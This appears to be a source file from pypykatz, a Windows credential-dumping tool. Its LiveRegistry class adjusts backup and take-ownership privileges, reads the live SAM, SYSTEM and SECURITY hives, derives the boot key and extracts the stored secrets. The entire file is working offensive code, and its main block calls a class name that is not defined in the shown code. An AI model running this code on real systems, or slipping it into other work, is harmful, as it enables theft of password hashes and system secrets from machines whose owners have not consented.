
import platform
if platform.system() != 'Windows':
	raise Exception('This will ONLY work on Windows systems!')

from pypykatz.registry.live_reader.reader import LiveRegistryHive
from pypykatz.registry import logger
from pypykatz.registry.sam.sam import *
from pypykatz.registry.security.security import *
from pypykatz.registry.system.system import *

from pypykatz.commons.readers.local.common.privileges import RtlAdjustPrivilege
from pypykatz.commons.readers.local.common.privileges_types import PrivilegeValues
from pypykatz.commons.elevate import getsystem_token


class LiveRegistry:
	def __init__(self):		
		self.sam_hive = None
		self.security_hive = None
		self.system_hive = None
		
		self.system = None
		self.sam = None
		self.security = None
		
	def get_secrets(self):
		#getsystem_token()
		try:
			RtlAdjustPrivilege(PrivilegeValues.SE_BACKUP.value)
			RtlAdjustPrivilege(PrivilegeValues.SE_TAKE_OWNERSHIP.value)
		except Exception as e:
			logger.error('Failed to obtain SE_BACKUP privilege! Registry dump will not work! Reason: %s' % str(e))
			raise e
		
		self.system = SYSTEM(self.system_hive)
		bootkey = self.system.get_bootkey()
		
		if self.sam_hive:
			self.sam = SAM(self.sam_hive, bootkey)
			self.sam.get_secrets()
			
		if self.security_hive:
			self.security = SECURITY(self.security_hive, bootkey)
			self.security.get_secrets()
			
		self.cleanup()
		
	def cleanup(self):
		for hive in [self.system_hive, self.security_hive, self.sam_hive]:
			try:
				hive.close()
			except:
				pass
		
	def to_file(self, json_format = False):
		pass
		
	def __str__(self):
		t = str(self.system)
		if self.sam:
			t += str(self.sam)
		if self.security:
			t += str(self.security)
		return t
		
	@staticmethod
	def go_live():
		lr = LiveRegistry()
		lr.sam_hive = LiveRegistryHive('SAM')
		lr.system_hive = LiveRegistryHive('SYSTEM')
		lr.security_hive = LiveRegistryHive('SECURITY')
		
		lr.get_secrets()
		return lr
	
	
if __name__ == '__main__':
	po = PypyKatzOffineRegistry.from_live_system()
	print(str(po))